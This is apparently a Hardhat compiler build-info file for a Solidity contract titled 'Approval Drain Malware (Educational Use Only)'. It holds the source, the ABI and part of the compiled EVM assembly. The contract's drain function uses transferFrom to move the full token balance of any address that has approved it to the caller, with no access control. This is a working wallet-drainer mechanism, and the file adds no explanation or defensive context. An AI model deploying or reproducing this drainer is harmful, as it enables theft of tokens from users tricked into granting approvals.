{
	"id": "aa56fdb694fa68f78d778f2467d43422",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.29",
	"solcLongVersion": "0.8.29+commit.ab55807c",
	"input": {
		"language": "Solidity",
		"sources": {
			"M/Approval Drain Malware.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/// @title Approval Drain Malware (Educational Use Only)\n/// @notice Simulates a malicious contract that drains approved ERC20 tokens\ncontract ApprovalDrain {\n    function drain(address token, address from) external {\n        IERC20(token).transferFrom(\n            from,\n            msg.sender,\n            IERC20(token).balanceOf(from)\n        );\n    }\n}\n"
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Interface of the ERC-20 standard as defined in the ERC.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC-20 standard as defined in the ERC.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the value of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the value of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC-20 standard as defined in the ERC.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets a `value` amount of tokens as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the value of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the value of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves a `value` amount of tokens from `from` to `to` using the allowance mechanism. `value` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0xe06a3f08a987af6ad2e1c1e774405d4fe08f1694b67517438b467cecf0da0ef7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://df6f0c459663c9858b6cba2cda1d14a7d05a985bed6d2de72bd8e78c25ee79db\",\"dweb:/ipfs/QmeTTxZ7qVk9rjEv2R4CpCwdf8UMCcRqDNMvzNxHc3Fnn9\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"M/Approval Drain Malware.sol": {
				"ApprovalDrain": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "token",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								}
							],
							"name": "drain",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"title": "Approval Drain Malware (Educational Use Only)",
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"M/Approval Drain Malware.sol\":250:472  contract ApprovalDrain {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"M/Approval Drain Malware.sol\":250:472  contract ApprovalDrain {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x837971e4\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"M/Approval Drain Malware.sol\":279:470  function drain(address token, address from) external {... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \"M/Approval Drain Malware.sol\":349:354  token */\n      dup2\n        /* \"M/Approval Drain Malware.sol\":342:368  IERC20(token).transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"M/Approval Drain Malware.sol\":382:386  from */\n      dup3\n        /* \"M/Approval Drain Malware.sol\":400:410  msg.sender */\n      caller\n        /* \"M/Approval Drain Malware.sol\":431:436  token */\n      dup6\n        /* \"M/Approval Drain Malware.sol\":424:447  IERC20(token).balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"M/Approval Drain Malware.sol\":448:452  from */\n      dup7\n        /* \"M/Approval Drain Malware.sol\":424:453  IERC20(token).balanceOf(from) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_12\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_12:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n        /* \"M/Approval Drain Malware.sol\":342:463  IERC20(token).transferFrom(... */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_15\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      pop\n        /* \"M/Approval Drain Malware.sol\":279:470  function drain(address token, address from) external {... */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_22:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_24:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_25:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_42\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_24\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_26:\n        /* \"#utility.yul\":641:665   */\n      tag_44\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_25\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_45\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      0x00\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_45:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_27:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_47\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_26\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:1315   */\n    tag_6:\n        /* \"#utility.yul\":909:915   */\n      0x00\n        /* \"#utility.yul\":917:923   */\n      0x00\n        /* \"#utility.yul\":966:968   */\n      0x40\n        /* \"#utility.yul\":954:963   */\n      dup4\n        /* \"#utility.yul\":945:952   */\n      dup6\n        /* \"#utility.yul\":941:964   */\n      sub\n        /* \"#utility.yul\":937:969   */\n      slt\n        /* \"#utility.yul\":934:1053   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":972:1051   */\n      tag_50\n      tag_22\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":934:1053   */\n    tag_49:\n        /* \"#utility.yul\":1092:1093   */\n      0x00\n        /* \"#utility.yul\":1117:1170   */\n      tag_51\n        /* \"#utility.yul\":1162:1169   */\n      dup6\n        /* \"#utility.yul\":1153:1159   */\n      dup3\n        /* \"#utility.yul\":1142:1151   */\n      dup7\n        /* \"#utility.yul\":1138:1160   */\n      add\n        /* \"#utility.yul\":1117:1170   */\n      tag_27\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1107:1170   */\n      swap3\n      pop\n        /* \"#utility.yul\":1063:1180   */\n      pop\n        /* \"#utility.yul\":1219:1221   */\n      0x20\n        /* \"#utility.yul\":1245:1298   */\n      tag_52\n        /* \"#utility.yul\":1290:1297   */\n      dup6\n        /* \"#utility.yul\":1281:1287   */\n      dup3\n        /* \"#utility.yul\":1270:1279   */\n      dup7\n        /* \"#utility.yul\":1266:1288   */\n      add\n        /* \"#utility.yul\":1245:1298   */\n      tag_27\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1235:1298   */\n      swap2\n      pop\n        /* \"#utility.yul\":1190:1308   */\n      pop\n        /* \"#utility.yul\":841:1315   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1321:1439   */\n    tag_28:\n        /* \"#utility.yul\":1408:1432   */\n      tag_54\n        /* \"#utility.yul\":1426:1431   */\n      dup2\n        /* \"#utility.yul\":1408:1432   */\n      tag_25\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1403:1406   */\n      dup3\n        /* \"#utility.yul\":1396:1433   */\n      mstore\n        /* \"#utility.yul\":1321:1439   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1445:1667   */\n    tag_10:\n        /* \"#utility.yul\":1538:1542   */\n      0x00\n        /* \"#utility.yul\":1576:1578   */\n      0x20\n        /* \"#utility.yul\":1565:1574   */\n      dup3\n        /* \"#utility.yul\":1561:1579   */\n      add\n        /* \"#utility.yul\":1553:1579   */\n      swap1\n      pop\n        /* \"#utility.yul\":1589:1660   */\n      tag_56\n        /* \"#utility.yul\":1657:1658   */\n      0x00\n        /* \"#utility.yul\":1646:1655   */\n      dup4\n        /* \"#utility.yul\":1642:1659   */\n      add\n        /* \"#utility.yul\":1633:1639   */\n      dup5\n        /* \"#utility.yul\":1589:1660   */\n      tag_28\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1445:1667   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1673:1750   */\n    tag_29:\n        /* \"#utility.yul\":1710:1717   */\n      0x00\n        /* \"#utility.yul\":1739:1744   */\n      dup2\n        /* \"#utility.yul\":1728:1744   */\n      swap1\n      pop\n        /* \"#utility.yul\":1673:1750   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1756:1878   */\n    tag_30:\n        /* \"#utility.yul\":1829:1853   */\n      tag_59\n        /* \"#utility.yul\":1847:1852   */\n      dup2\n        /* \"#utility.yul\":1829:1853   */\n      tag_29\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1822:1827   */\n      dup2\n        /* \"#utility.yul\":1819:1854   */\n      eq\n        /* \"#utility.yul\":1809:1872   */\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1868:1869   */\n      0x00\n        /* \"#utility.yul\":1865:1866   */\n      0x00\n        /* \"#utility.yul\":1858:1870   */\n      revert\n        /* \"#utility.yul\":1809:1872   */\n    tag_60:\n        /* \"#utility.yul\":1756:1878   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1884:2027   */\n    tag_31:\n        /* \"#utility.yul\":1941:1946   */\n      0x00\n        /* \"#utility.yul\":1972:1978   */\n      dup2\n        /* \"#utility.yul\":1966:1979   */\n      mload\n        /* \"#utility.yul\":1957:1979   */\n      swap1\n      pop\n        /* \"#utility.yul\":1988:2021   */\n      tag_62\n        /* \"#utility.yul\":2015:2020   */\n      dup2\n        /* \"#utility.yul\":1988:2021   */\n      tag_30\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":1884:2027   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2033:2384   */\n    tag_14:\n        /* \"#utility.yul\":2103:2109   */\n      0x00\n        /* \"#utility.yul\":2152:2154   */\n      0x20\n        /* \"#utility.yul\":2140:2149   */\n      dup3\n        /* \"#utility.yul\":2131:2138   */\n      dup5\n        /* \"#utility.yul\":2127:2150   */\n      sub\n        /* \"#utility.yul\":2123:2155   */\n      slt\n        /* \"#utility.yul\":2120:2239   */\n      iszero\n      tag_64\n      jumpi\n        /* \"#utility.yul\":2158:2237   */\n      tag_65\n      tag_22\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2120:2239   */\n    tag_64:\n        /* \"#utility.yul\":2278:2279   */\n      0x00\n        /* \"#utility.yul\":2303:2367   */\n      tag_66\n        /* \"#utility.yul\":2359:2366   */\n      dup5\n        /* \"#utility.yul\":2350:2356   */\n      dup3\n        /* \"#utility.yul\":2339:2348   */\n      dup6\n        /* \"#utility.yul\":2335:2357   */\n      add\n        /* \"#utility.yul\":2303:2367   */\n      tag_31\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":2293:2367   */\n      swap2\n      pop\n        /* \"#utility.yul\":2249:2377   */\n      pop\n        /* \"#utility.yul\":2033:2384   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2390:2508   */\n    tag_32:\n        /* \"#utility.yul\":2477:2501   */\n      tag_68\n        /* \"#utility.yul\":2495:2500   */\n      dup2\n        /* \"#utility.yul\":2477:2501   */\n      tag_29\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":2472:2475   */\n      dup3\n        /* \"#utility.yul\":2465:2502   */\n      mstore\n        /* \"#utility.yul\":2390:2508   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2514:2956   */\n    tag_16:\n        /* \"#utility.yul\":2663:2667   */\n      0x00\n        /* \"#utility.yul\":2701:2703   */\n      0x60\n        /* \"#utility.yul\":2690:2699   */\n      dup3\n        /* \"#utility.yul\":2686:2704   */\n      add\n        /* \"#utility.yul\":2678:2704   */\n      swap1\n      pop\n        /* \"#utility.yul\":2714:2785   */\n      tag_70\n        /* \"#utility.yul\":2782:2783   */\n      0x00\n        /* \"#utility.yul\":2771:2780   */\n      dup4\n        /* \"#utility.yul\":2767:2784   */\n      add\n        /* \"#utility.yul\":2758:2764   */\n      dup7\n        /* \"#utility.yul\":2714:2785   */\n      tag_28\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2795:2867   */\n      tag_71\n        /* \"#utility.yul\":2863:2865   */\n      0x20\n        /* \"#utility.yul\":2852:2861   */\n      dup4\n        /* \"#utility.yul\":2848:2866   */\n      add\n        /* \"#utility.yul\":2839:2845   */\n      dup6\n        /* \"#utility.yul\":2795:2867   */\n      tag_28\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2877:2949   */\n      tag_72\n        /* \"#utility.yul\":2945:2947   */\n      0x40\n        /* \"#utility.yul\":2934:2943   */\n      dup4\n        /* \"#utility.yul\":2930:2948   */\n      add\n        /* \"#utility.yul\":2921:2927   */\n      dup5\n        /* \"#utility.yul\":2877:2949   */\n      tag_32\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2514:2956   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2962:3052   */\n    tag_33:\n        /* \"#utility.yul\":2996:3003   */\n      0x00\n        /* \"#utility.yul\":3039:3044   */\n      dup2\n        /* \"#utility.yul\":3032:3045   */\n      iszero\n        /* \"#utility.yul\":3025:3046   */\n      iszero\n        /* \"#utility.yul\":3014:3046   */\n      swap1\n      pop\n        /* \"#utility.yul\":2962:3052   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3058:3174   */\n    tag_34:\n        /* \"#utility.yul\":3128:3149   */\n      tag_75\n        /* \"#utility.yul\":3143:3148   */\n      dup2\n        /* \"#utility.yul\":3128:3149   */\n      tag_33\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":3121:3126   */\n      dup2\n        /* \"#utility.yul\":3118:3150   */\n      eq\n        /* \"#utility.yul\":3108:3168   */\n      tag_76\n      jumpi\n        /* \"#utility.yul\":3164:3165   */\n      0x00\n        /* \"#utility.yul\":3161:3162   */\n      0x00\n        /* \"#utility.yul\":3154:3166   */\n      revert\n        /* \"#utility.yul\":3108:3168   */\n    tag_76:\n        /* \"#utility.yul\":3058:3174   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3180:3317   */\n    tag_35:\n        /* \"#utility.yul\":3234:3239   */\n      0x00\n        /* \"#utility.yul\":3265:3271   */\n      dup2\n        /* \"#utility.yul\":3259:3272   */\n      mload\n        /* \"#utility.yul\":3250:3272   */\n      swap1\n      pop\n        /* \"#utility.yul\":3281:3311   */\n      tag_78\n        /* \"#utility.yul\":3305:3310   */\n      dup2\n        /* 